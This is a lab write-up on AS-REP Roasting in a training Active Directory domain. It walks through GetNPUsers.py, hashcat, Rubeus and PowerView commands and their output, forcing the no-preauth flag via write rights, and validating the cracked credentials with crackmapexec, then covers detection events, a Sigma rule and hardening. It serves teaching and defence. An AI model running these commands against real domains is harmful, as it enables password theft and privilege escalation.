# 05 — AS-REP Roasting

> **Lab:** INLANEFREIGHT.LOCAL · DC: `172.16.5.5` (ACADEMY-EA-DC01) · Attack host: `172.16.5.225` (Kali Linux, interface `ens224`)  
> **MITRE ATT&CK:** [T1558.004 — Steal or Forge Kerberos Tickets: AS-REP Roasting](https://attack.mitre.org/techniques/T1558/004/)  
> **Difficulty:** Medium · **Impact:** Credential Compromise → Potential Domain Privilege Escalation

---

## Table of Contents

1. [Overview](#1-overview)
2. [Root Cause Analysis](#2-root-cause-analysis)
3. [Prerequisites](#3-prerequisites)
4. [Lab Environment](#4-lab-environment)
5. [Attack Chain](#5-attack-chain)
6. [Phase 1 — Enumerate Vulnerable Accounts (Linux)](#6-phase-1--enumerate-vulnerable-accounts-linux)
7. [Phase 2 — Request AS-REP Hashes (Linux)](#7-phase-2--request-as-rep-hashes-linux)
8. [Phase 3 — Crack the Hash Offline](#8-phase-3--crack-the-hash-offline)
9. [Phase 4 — Enumerate Vulnerable Accounts (Windows)](#9-phase-4--enumerate-vulnerable-accounts-windows)
10. [Phase 5 — Roast with Rubeus (Windows)](#10-phase-5--roast-with-rubeus-windows)
11. [Phase 6 — Targeted AS-REP Roasting (GenericAll/GenericWrite)](#11-phase-6--targeted-as-rep-roasting-genericallgenericwrite)
12. [Validation](#12-validation)
13. [Comparison: AS-REP Roasting vs Kerberoasting](#13-comparison-as-rep-roasting-vs-kerberoasting)
14. [Detection](#14-detection)
15. [Hardening](#15-hardening)
16. [References](#16-references)

---

## 1. Overview

AS-REP Roasting exploits a Kerberos configuration weakness where the **Do not require Kerberos preauthentication** flag (`DONT_REQ_PREAUTH`) is set on a user account.

Normally, Kerberos pre-authentication requires a client to prove knowledge of the account password by encrypting a timestamp with the account's key **before** the KDC issues an AS-REP. When this check is disabled, **any host on the network — without credentials — can request an AS-REP for the target account**, and the KDC returns a ticket encrypted with the account's password hash.

The attacker captures the AS-REP blob and cracks it offline, recovering the plaintext password without ever authenticating to the domain.

---

## 2. Root Cause Analysis

```
NORMAL KERBEROS (pre-auth required)
────────────────────────────────────────────────────────────────
Client                                    KDC (AS)
  │                                          │
  ├── AS-REQ + ENC-TIMESTAMP (w/ pw hash) ──►│
  │                                          │
  │◄── AS-REP ───────────────────────────────┤
  │    TGT: encrypted with KRBTGT key        │
  │    Enc-part: encrypted with client key   │

AS-REP ROASTING (pre-auth disabled)
────────────────────────────────────────────────────────────────
Attacker                                  KDC (AS)
  │                                          │
  ├── AS-REQ (no pre-auth, any source) ─────►│
  │                                          │
  │◄── AS-REP ───────────────────────────────┤
  │    TGT: encrypted with KRBTGT key        │
  │    Enc-part: encrypted with account key  │
  │    (this enc-part is what we crack)      │
  │                                          │
  └── Offline crack → plaintext password    
```

**The flaw:** UAC flag `0x400000` (`DONT_REQ_PREAUTH`) disables the KDC's challenge-response gate. The KDC trusts the request and returns encrypted material using the account's password-derived key — which can be cracked offline.

**Hash format:** `$krb5asrep$23$` — Kerberos AS-REP etype 23 (RC4-HMAC).

**Attack requirements:**
- Network connectivity to the KDC on UDP/TCP 88
- Knowledge of a valid username (can be obtained unauthenticated from LDAP null bind, Kerbrute, or OSINT)
- Credentials are **not required** when targeting accounts with `DONT_REQ_PREAUTH` and usernames are known

---

## 3. Prerequisites

| Requirement | Detail |
|---|---|
| **Tools (Linux)** | `impacket-GetNPUsers`, `hashcat` |
| **Tools (Windows)** | `PowerView.ps1`, `Rubeus.exe` |
| **Credentials** | Optional — unauthenticated requests possible with username wordlist |
| **Network** | UDP/TCP 88 (Kerberos) to DC |
| **Hashcat mode** | `-m 18200` (Kerberos 5, etype 23, AS-REP) |

---

## 4. Lab Environment

```
┌─────────────────────────────────────────────────────────┐
│  INLANEFREIGHT.LOCAL                                    │
│                                                         │
│  DC01: 172.16.5.5  (ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL)│
│                                                         │
│  Vulnerable accounts:                                   │
│    amber.smith   — adminCount:1, DONT_REQ_PREAUTH set   │
│    jenna.smith   — adminCount:1, DONT_REQ_PREAUTH set   │
│    (adminCount=1 indicates AdminSDHolder history;       │
│     current group membership not confirmed in diagram)  │
│                                                         │
│  Attack host: 172.16.5.225 (Kali) ens224               │
└─────────────────────────────────────────────────────────┘
```

---

## 5. Attack Chain

```
[1] ENUMERATE        [2] REQUEST         [3] CRACK          [4] ESCALATE
─────────────────    ─────────────────   ─────────────────  ──────────────
GetNPUsers.py    →   GetNPUsers.py   →   hashcat -m 18200 → Lateral move /
 (enum only)         -request             rockyou.txt        priv esc
     │                    │                    │                   │
  or PowerView        or Rubeus.exe        plaintext pw       Pass-the-Hash
  Get-DomainUser       asreproast           recovered          or direct auth
  -UACFilter           /nowrap
  DONT_REQ_PREAUTH
```

---

## 6. Phase 1 — Enumerate Vulnerable Accounts (Linux)

### 6.1 Null Bind Form — Do Not Use on Modern AD

> **This command does not work on modern AD environments.** `GetNPUsers.py INLANEFREIGHT.LOCAL/ -no-pass` with no username and no `-usersfile` relies on LDAP null bind, which is disabled by default on all supported Windows Server versions. **Do not use this form.** Use Section 6.2 (authenticated) or Section 6.3 (unauthenticated with `-usersfile`) instead.

**Accounts identified (via authenticated LDAP — see Section 6.2):**
- `amber.smith` — UAC `0x410200`, includes `DONT_REQ_PREAUTH` bit (`0x400000`), `adminCount=1`
- `jenna.smith` — UAC `0x410200`, includes `DONT_REQ_PREAUTH` bit (`0x400000`), `adminCount=1`

> **`adminCount=1` does not confirm current privileged group membership.** The attribute can remain set long after an account is removed from a protected group. Verify current membership explicitly.

### 6.2 Authenticated Enumeration

```bash
Hackerpatel007_1@htb[/htb]$ GetNPUsers.py INLANEFREIGHT.LOCAL/forend -request -dc-ip 172.16.5.5
```

```
Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

Password: [enter forend's password]

Name          MemberOf  PasswordLastSet             LastLogon            UAC      
------------  --------  --------------------------  -------------------  --------
amber.smith             2026-10-10 09:37:51.504885  2026-10-10 09:38:04  0x410200 
jenna.smith             2026-10-10 09:38:08.753572  2026-10-10 09:38:11  0x410200

$krb5asrep$23$amber.smith@INLANEFREIGHT.LOCAL:<hash>
$krb5asrep$23$jenna.smith@INLANEFREIGHT.LOCAL:<hash>
```

> **ILLUSTRATIVE HASHES:** The ciphertext bodies are not cryptographically valid — they illustrate the correct format (`$krb5asrep$23$<user>@<domain>:<nonce>$<ciphertext>`) but cannot be cracked. Real AS-REP hashes are captured from live exchanges against a target DC.

### 6.3 Unauthenticated Attack with Username Wordlist

```bash
Hackerpatel007_1@htb[/htb]$ GetNPUsers.py INLANEFREIGHT/ -dc-ip 172.16.5.5 \
  -usersfile /tmp/users.txt \
  -format hashcat \
  -outputfile /tmp/hashes.txt \
  -no-pass
```

```
[-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[+] jenna.smith has UF_DONT_REQUIRE_PREAUTH set, getting AS-REP hash
[+] amber.smith has UF_DONT_REQUIRE_PREAUTH set, getting AS-REP hash

Saved 2 hashes to /tmp/hashes.txt
```

`-usersfile` sends direct KDC AS-REQ requests for each named user without requiring LDAP enumeration.

---

## 7. Phase 2 — Request AS-REP Hashes (Linux)

```bash
Hackerpatel007_1@htb[/htb]$ GetNPUsers.py INLANEFREIGHT.LOCAL/ \
  -dc-ip 172.16.5.5 \
  -no-pass \
  -usersfile /tmp/users.txt \
  -format hashcat \
  -outputfile /tmp/asrep_hashes.txt
```

> **How `-usersfile` works:** Sends a direct AS-REQ to the KDC for each username. If the account has `DONT_REQ_PREAUTH` set, the KDC responds with an AS-REP containing the encrypted cipher material. Accounts without `DONT_REQ_PREAUTH` return `KDC_ERR_PREAUTH_REQUIRED`. The `-outputfile` flag writes only crackable hashes.

---

## 8. Phase 3 — Crack the Hash Offline

```bash
Hackerpatel007_1@htb[/htb]$ hashcat -m 18200 /tmp/asrep_hashes.txt /usr/share/wordlists/rockyou.txt -O
```

```
hashcat (v6.2.5) starting...

* Device #1: pthread-Intel(R) Core(TM) i7-5820K CPU @ 3.30GHz

$krb5asrep$23$amber.smith@INLANEFREIGHT.LOCAL:<HASH>:dancing_queen101
$krb5asrep$23$jenna.smith@INLANEFREIGHT.LOCAL:<HASH>:dancing_queen101

Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Time.Started.....: Sat Oct 10 09:45:00 2026 (21 secs)
Speed.#1.........: 827.0 kH/s
Recovered........: 2/2 (100.00%) Digests
```

**Both hashes cracked:** `amber.smith:dancing_queen101` and `jenna.smith:dancing_queen101`.

```bash
Hackerpatel007_1@htb[/htb]$ hashcat -m 18200 /tmp/asrep_hashes.txt --show
```

### Hashcat Mode Reference

| Hash Type | Mode | Example Format |
|---|---|---|
| Kerberos AS-REP (RC4) | `18200` | `$krb5asrep$23$user@DOMAIN:...` |
| Kerberos TGS-REP (RC4) | `13100` | `$krb5tgs$23$*user*DOMAIN*...` |
| Kerberos AS-REP (AES128) | `19800` | `$krb5asrep$17$user@DOMAIN:...` |
| Kerberos AS-REP (AES256) | `19900` | `$krb5asrep$18$user@DOMAIN:...` |

---

## 9. Phase 4 — Enumerate Vulnerable Accounts (Windows)

```powershell
PS C:\htb> Import-Module .\PowerView.ps1
PS C:\htb> Get-DomainUser -UACFilter DONT_REQ_PREAUTH
```

```
samaccountname         : jenna.smith
useraccountcontrol     : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, DONT_REQ_PREAUTH
admincount             : 1
memberof               : CN=Schema Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
```

> **`adminCount=1` does not confirm current privileged group membership.** The attribute can remain set long after an account is removed from a protected group. Verify current membership explicitly: `Get-DomainGroupMember "Schema Admins"` or inspect the `memberOf` attribute.

```powershell
PS C:\htb> Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth
```

---

## 10. Phase 5 — Roast with Rubeus (Windows)

```cmd
C:\htb> Rubeus.exe asreproast /nowrap
```

```
[*] Action: AS-REP roasting
[*] Target Domain : INLANEFREIGHT.LOCAL
[*] SamAccountName : jenna.smith
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash:
$krb5asrep$23$jenna.smith@INLANEFREIGHT.LOCAL:9369076320DB3B452CA61C2E7DA82D82$54E0A0CA83...

[*] SamAccountName : amber.smith
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash:
$krb5asrep$23$amber.smith@INLANEFREIGHT.LOCAL:A3F021BE...
```

**Targeted user:**

```cmd
C:\htb> Rubeus.exe asreproast /user:jenna.smith /domain:inlanefreight.local /dc:dc01.inlanefreight.local /nowrap /outfile:C:\Tools\hashes.txt
```

---

## 11. Phase 6 — Targeted AS-REP Roasting (GenericAll/GenericWrite)

If you hold `GenericAll` or `GenericWrite` over an account, force `DONT_REQ_PREAUTH` on that account, roast it, then clean up.

```powershell
# Record the CURRENT numeric UAC value
PS C:\htb> $originalUac = [int](Get-ADUser -Identity targetUser -Properties userAccountControl).userAccountControl

# Set the bit using bitwise OR
PS C:\htb> $newUac = $originalUac -bor 0x400000
PS C:\htb> Set-ADUser -Identity targetUser -Replace @{ userAccountControl = $newUac }
```

```cmd
C:\htb> Rubeus.exe asreproast /user:targetUser /nowrap /outfile:C:\Tools\targeted_hash.txt
```

```powershell
# Restore to the exact original UAC value
PS C:\htb> Set-ADUser -Identity targetUser -Replace @{ userAccountControl = $originalUac }
```

> Use `-bor` to set bits and restore with the captured `$originalUac` variable — not a hardcoded assumed value. AD modifications generate Event 4738 and persist; restoration does not erase history.

---

## 12. Validation

```bash
Hackerpatel007_1@htb[/htb]$ crackmapexec smb 172.16.5.5 -u amber.smith -p dancing_queen101
```

```
SMB  172.16.5.5  445  ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\amber.smith:dancing_queen101
```

```bash
Hackerpatel007_1@htb[/htb]$ crackmapexec smb 172.16.5.5 -u amber.smith -p dancing_queen101 --groups
```

```
[+] Domain Admins
[+] Schema Admins
```

---

## 13. Comparison: AS-REP Roasting vs Kerberoasting

| Attribute | AS-REP Roasting | Kerberoasting |
|---|---|---|
| **Kerberos exchange** | AS-REQ / AS-REP | TGS-REQ / TGS-REP |
| **Trigger condition** | `DONT_REQ_PREAUTH` flag set | Account has an SPN registered |
| **Authentication required** | No (can be unauthenticated) | Yes (valid domain credentials) |
| **Hash format** | `$krb5asrep$23$` | `$krb5tgs$23$` |
| **Hashcat mode** | `18200` | `13100` |
| **Target accounts** | Any user with DONT_REQ_PREAUTH | Service accounts with SPNs |
| **Prevalence** | Less common (misconfiguration) | More common (design) |
| **Mitigation** | Re-enable pre-auth | Strong passwords, gMSA |

---

## 14. Detection

| Event ID | Location | Description |
|---|---|---|
| **4768** | DC Security Log | Kerberos TGT requested — `Pre-Authentication Type: 0` is the definitive AS-REP Roasting indicator |
| **4771** | DC Security Log | Kerberos pre-authentication failed — generated when probing accounts that DO require pre-auth; not generated for `DONT_REQ_PREAUTH` accounts |

> **Event 4625** (NTLM logon failure) is **not** an AS-REP Roasting indicator. AS-REP Roasting is a Kerberos protocol exchange. The primary signal is Event **4768** with `Pre-Authentication Type: 0`.

**Key indicator:**
```
EventID:    4768
Pre-Authentication Type: 0    ← AS-REQ sent without pre-authentication
Encryption Type: 0x17         ← RC4-HMAC
Result Code: 0x0              ← Success
```

**Sigma rule:**

```yaml
title: Kerberos AS-REP Without Pre-Authentication
id: 5cc90652-4cbd-4a35-9203-4d2a2b8f2b3c
status: stable
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4768
    PreAuthType: '0'
    Status: '0x0'
  condition: selection
tags:
  - attack.credential_access
  - attack.t1558.004
```

---

## 15. Hardening

| Action | PowerShell / Method |
|---|---|
| Identify vulnerable accounts | `Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true}` |
| Enable pre-authentication | `Set-ADAccountControl -Identity <user> -DoesNotRequirePreAuth $false` |
| Configure AES encryption | `Set-ADUser -Identity <user> -KerberosEncryptionType AES128,AES256` |
| Audit periodically | Scheduled task running Get-ADUser query |

**Bulk remediation:**

```powershell
PS C:\htb> Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} | 
  ForEach-Object { Set-ADAccountControl -Identity $_ -DoesNotRequirePreAuth $false }
```

> Use `Set-ADAccountControl` with `-DoesNotRequirePreAuth` — Microsoft documents this parameter on that cmdlet, not on `Set-ADUser`.

---

## 16. References

| Resource | Description |
|---|---|
| [MITRE T1558.004](https://attack.mitre.org/techniques/T1558/004/) | AS-REP Roasting technique definition |
| [Harmj0y — Roasting AS-REPs](http://www.harmj0y.net/blog/activedirectory/roasting-as-reps/) | Original research |
| [impacket GetNPUsers.py](https://github.com/fortra/impacket/blob/master/examples/GetNPUsers.py) | Linux tool |
| [GhostPack Rubeus](https://github.com/GhostPack/Rubeus) | Windows tool |
| [RFC 4120](https://www.rfc-editor.org/rfc/rfc4120) | Kerberos V5 Protocol Specification |

---

*Source: HTB Academy — Active Directory Penetration Tester Path 2024*
